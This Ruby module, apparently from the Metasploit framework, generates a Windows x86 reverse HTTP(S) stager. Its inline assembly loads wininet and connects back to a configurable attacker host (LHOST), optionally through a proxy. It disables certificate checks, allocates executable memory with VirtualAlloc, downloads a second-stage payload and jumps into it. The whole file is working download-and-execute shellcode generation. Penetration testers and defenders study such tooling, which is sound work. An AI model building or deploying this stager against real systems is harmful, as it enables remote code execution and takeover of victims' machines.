# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/block_api'
require 'msf/core/payload/windows/exitfunk'
require 'msf/core/payload/uuid/options'

module Msf

###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
#
###

module Payload::Windows::ReverseHttp

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi
  include Msf::Payload::Windows::Exitfunk
  include Msf::Payload::UUID::Options

  #
  # Register reverse_http specific options
  #
  def initialize(*args)
    super
    register_advanced_options(
      [ OptInt.new('StagerURILength', 'The URI length for the stager (at least 5 bytes)') ] +
      Msf::Opt::stager_retry_options +
      Msf::Opt::http_header_options +
      Msf::Opt::http_proxy_options
    )
  end

  #
  # Generate the first stage
  #
  def generate(opts={})
    ds = opts[:datastore] || datastore
    conf = {
      ssl:         opts[:ssl] || false,
      host:        ds['LHOST'] || '127.127.127.127',
      port:        ds['LPORT'],
      retry_count: ds['StagerRetryCount'],
      retry_wait:  ds['StagerRetryWait']
    }

    # Add extra options if we have enough space
    if self.available_space.nil? || required_space <= self.available_space
      conf[:url]            = luri + generate_uri(opts)
      conf[:exitfunk]       = ds['EXITFUNC']
      conf[:ua]             = ds['HttpUserAgent']
      conf[:proxy_host]     = ds['HttpProxyHost']
      conf[:proxy_port]     = ds['HttpProxyPort']
      conf[:proxy_user]     = ds['HttpProxyUser']
      conf[:proxy_pass]     = ds['HttpProxyPass']
      conf[:proxy_type]     = ds['HttpProxyType']
      conf[:custom_headers] = get_custom_headers(ds)
    else
      # Otherwise default to small URIs
      conf[:url]        = luri + generate_small_uri
    end

    generate_reverse_http(conf)
  end

  #
  # Generate the custom headers string
  #
  def get_custom_headers(ds)
    headers = ""
    headers << "Host: #{ds['HttpHostHeader']}\r\n" if ds['HttpHostHeader']
    headers << "Cookie: #{ds['HttpCookie']}\r\n" if ds['HttpCookie']
    headers << "Referer: #{ds['HttpReferer']}\r\n" if ds['HttpReferer']

    if headers.length > 0
      headers
    else
      nil
    end
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_http(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_http(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_http(opts)
  end

  #
  # Generate the URI for the initial stager
  #
  def generate_uri(opts={})
    ds = opts[:datastore] || datastore
    uri_req_len = ds['StagerURILength'].to_i

    # Choose a random URI length between 30 and 255 bytes
    if uri_req_len == 0
      uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
    end

    if uri_req_len < 5
      raise ArgumentError, "Minimum StagerURILength is 5"
    end

    generate_uri_uuid_mode(:init_native, uri_req_len)
  end

  #
  # Generate the URI for the initial stager
  #
  def generate_small_uri
    generate_uri_uuid_mode(:init_native, 30)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # Add 100 bytes for the encoder to have some room
    space += 100

    # Make room for the maximum possible URL length
    space += 256

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # Proxy options?
    space += 200

    # Custom headers? Ugh, impossible to tell
    space += 512

    # The final estimated size
    space
  end

  #
  # Convert a string into a NULL-terminated ASCII byte array
  #
  def asm_generate_ascii_array(str)
    (str.to_s + "\x00").
      unpack("C*").
      map{ |c| "0x%.2x" % c }.
      join(",")
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Bool] :ssl Whether or not to enable SSL
  # @option opts [String] :url The URI to request during staging
  # @option opts [String] :host The host to connect to
  # @option opts [Integer] :port The port to connect to
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [String] :proxy_host The optional proxy server host to use
  # @option opts [Integer] :proxy_port The optional proxy server port to use
  # @option opts [String] :proxy_type The optional proxy server type, one of HTTP or SOCKS
  # @option opts [String] :proxy_user The optional proxy server username
  # @option opts [String] :proxy_pass The optional proxy server password
  # @option opts [String] :custom_headers The optional collection of custom headers for the payload.
  # @option opts [Integer] :retry_count The number of times to retry a failed request before giving up
  # @option opts [Integer] :retry_wait The seconds to wait before retry a new request
  #
  def asm_reverse_http(opts={})

    retry_count   = opts[:retry_count].to_i
    retry_wait   = opts[:retry_wait].to_i * 1000
    proxy_enabled = !!(opts[:proxy_host].to_s.strip.length > 0)
    proxy_info    = ""

    if proxy_enabled
      if opts[:proxy_type].to_s.downcase == "socks"
        proxy_info << "socks="
      else
        proxy_info << "http://"
      end

      proxy_info << opts[:proxy_host].to_s
      if opts[:proxy_port].to_i > 0
        proxy_info << ":#{opts[:proxy_port]}"
      end
    end

    proxy_user = opts[:proxy_user].to_s.length == 0 ? nil : opts[:proxy_user]
    proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : opts[:proxy_pass]

    custom_headers = opts[:custom_headers].to_s.length == 0 ? nil : asm_generate_ascii_array(opts[:custom_headers])

    http_open_flags = 0
    secure_flags = 0

    if opts[:ssl]
      http_open_flags = (
        0x80000000 | # INTERNET_FLAG_RELOAD
        0x04000000 | # INTERNET_NO_CACHE_WRITE
        0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
        0x00000200 | # INTERNET_FLAG_NO_UI
        0x00800000 | # INTERNET_FLAG_SECURE
        0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
        0x00001000 ) # INTERNET_FLAG_IGNORE_CERT_CN_INVALID

      secure_flags = (
        0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
        0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
        0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
        0x00000100 | # SECURITY_FLAG_IGNORE_UNKNOWN_CA
        0x00000080 ) # SECURITY_FLAG_IGNORE_REVOCATION
    else
      http_open_flags = (
        0x80000000 | # INTERNET_FLAG_RELOAD
        0x04000000 | # INTERNET_NO_CACHE_WRITE
        0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
        0x00000200 ) # INTERNET_FLAG_NO_UI
    end

    asm = %Q^
      ;-----------------------------------------------------------------------------;
      ; Compatible: Confirmed Windows 8.1, Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
      ; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
      ;-----------------------------------------------------------------------------;

      ; Input: EBP must be the address of 'api_call'.
      ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
      load_wininet:
        push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
        push 0x696e6977        ; ...
        push esp               ; Push a pointer to the "wininet" string on the stack.
        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        call ebp               ; LoadLibraryA( "wininet" )
        xor ebx, ebx           ; Set ebx to NULL to use in future arguments
    ^

    asm << %Q^
    internetopen:
      push ebx               ; DWORD dwFlags
    ^
    if proxy_enabled
      asm << %Q^
        push esp               ; LPCTSTR lpszProxyBypass ("" = empty string)
      call get_proxy_server
        db "#{proxy_info}", 0x00
      get_proxy_server:
                               ; LPCTSTR lpszProxyName (via call)
        push 3                 ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY = 3)
      ^
    else
      asm << %Q^
        push ebx               ; LPCTSTR lpszProxyBypass (NULL)
        push ebx               ; LPCTSTR lpszProxyName (NULL)
        push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
      ^
    end
    if opts[:ua].nil?
      asm << %Q^
        push ebx               ; LPCTSTR lpszAgent (NULL)
      ^
    else
      asm << %Q^
        push ebx               ; LPCTSTR lpszProxyBypass (NULL)
      call get_useragent
        db "#{opts[:ua]}", 0x00
                               ; LPCTSTR lpszAgent (via call)
      get_useragent:
      ^
    end
    asm << %Q^
      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
      call ebp
    ^

    asm << %Q^
      internetconnect:
        push ebx               ; DWORD_PTR dwContext (NULL)
        push ebx               ; dwFlags
        push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
        push ebx               ; password (NULL)
        push ebx               ; username (NULL)
        push #{opts[:port]}    ; PORT
        call got_server_uri    ; double call to get pointer for both server_uri and
      server_uri:              ; server_host; server_uri is saved in EDI for later
        db "#{opts[:url]}", 0x00
      got_server_host:
        push eax               ; HINTERNET hInternet (still in eax from InternetOpenA)
        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetConnectA')}
        call ebp
        mov esi, eax           ; Store hConnection in esi
    ^

    # Note: wine-1.6.2 does not support SSL w/proxy authentication properly, it
    # doesn't set the Proxy-Authorization header on the CONNECT request.

    if proxy_enabled && proxy_user
      asm << %Q^
        ; DWORD dwBufferLength (length of username)
        push #{proxy_user.length}
        call set_proxy_username
      proxy_username:
        db "#{proxy_user}",0x00
      set_proxy_username:
                             ; LPVOID lpBuffer (username from previous call)
        push 43              ; DWORD dwOption (INTERNET_OPTION_PROXY_USERNAME)
        push esi             ; hConnection
        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
        call ebp
      ^
    end

    if proxy_enabled && proxy_pass
      asm << %Q^
        ; DWORD dwBufferLength (length of password)
        push #{proxy_pass.length}
        call set_proxy_password
      proxy_password:
        db "#{proxy_pass}",0x00
      set_proxy_password:
                             ; LPVOID lpBuffer (password from previous call)
        push 44              ; DWORD dwOption (INTERNET_OPTION_PROXY_PASSWORD)
        push esi             ; hConnection
        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
        call ebp
      ^
    end

    asm << %Q^
      httpopenrequest:
        push ebx               ; dwContext (NULL)
        push #{"0x%.8x" % http_open_flags}   ; dwFlags
        push ebx               ; accept types
        push ebx               ; referrer
        push ebx               ; version
        push edi               ; server URI
        push ebx               ; method
        push esi               ; hConnection
        push #{Rex::Text.block_api_hash('wininet.dll', 'HttpOpenRequestA')}
        call ebp
        xchg esi, eax          ; save hHttpRequest in esi
     ^
    if retry_count > 0
      asm << %Q^
      ; Store our retry counter in the edi register
      set_retry:
        push #{retry_count}
        pop edi
      ^
    end

    asm << %Q^
      send_request:
    ^

    if opts[:ssl]
      asm << %Q^
      ; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
      set_security_options:
        push 0x#{secure_flags.to_s(16)}
       mov eax, esp
        push 4                 ; sizeof(dwFlags)
        push eax               ; &dwFlags
        push 31                ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
        push esi               ; hHttpRequest
        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
        call ebp
      ^
    end

    asm << %Q^
      httpsendrequest:
        push ebx               ; lpOptional length (0)
        push ebx               ; lpOptional (NULL)
    ^

    if custom_headers
      asm << %Q^
        push -1                ; dwHeadersLength (assume NULL terminated)
        call get_req_headers   ; lpszHeaders (pointer to the custom headers)
        db #{custom_headers}
      get_req_headers:
      ^
    else
      asm << %Q^
        push ebx               ; HeadersLength (0)
        push ebx               ; Headers (NULL)
      ^
    end

    asm << %Q^
        push esi               ; hHttpRequest
        push #{Rex::Text.block_api_hash('wininet.dll', 'HttpSendRequestA')}
        call ebp
        test eax,eax
        jnz allocate_memory

     set_wait:
        push #{retry_wait}     ; dwMilliseconds
        push #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
        call ebp               ; Sleep( dwMilliseconds );
      ^

    if retry_count > 0
      asm << %Q^
        try_it_again:
          dec edi
          jnz send_request

        ; if we didn't allocate before running out of retries, bail out
        ^
    else
      asm << %Q^
        try_it_again:
          jmp send_request

        ; retry forever
        ^
    end

    if opts[:exitfunk]
      asm << %Q^
    failure:
      call exitfunk
      ^
    else
      asm << %Q^
    failure:
      push 0x56A2B5F0        ; hardcoded to exitprocess for size
      call ebp
      ^
    end

    asm << %Q^
    allocate_memory:
      push 0x40              ; PAGE_EXECUTE_READWRITE
      push 0x1000            ; MEM_COMMIT
      push 0x00400000        ; Stage allocation (4Mb ought to do us)
      push ebx               ; NULL as we dont care where the allocation is
      push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

    download_prep:
      xchg eax, ebx          ; place the allocated base address in ebx
      push ebx               ; store a copy of the stage base address on the stack
      push ebx               ; temporary storage for bytes read count
      mov edi, esp           ; &bytesRead

    download_more:
      push edi               ; &bytesRead
      push 8192              ; read length
      push ebx               ; buffer
      push esi               ; hRequest
      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}
      call ebp

      test eax,eax           ; download failed? (optional?)
      jz failure

      mov eax, [edi]
      add ebx, eax           ; buffer += bytes_received

      test eax,eax           ; optional?
      jnz download_more      ; continue until it returns 0
      pop eax                ; clear the temporary storage

    execute_stage:
      ret                    ; dive into the stored stage address

    got_server_uri:
      pop edi
      call got_server_host

    server_host:
      db "#{opts[:host]}", 0x00
    ^

    if opts[:exitfunk]
      asm << asm_exitfunk(opts)
    end

    asm
  end

  #
  # Do not transmit the stage over the connection.  We handle this via HTTPS
  #
  def stage_over_connection?
    false
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end

end

end

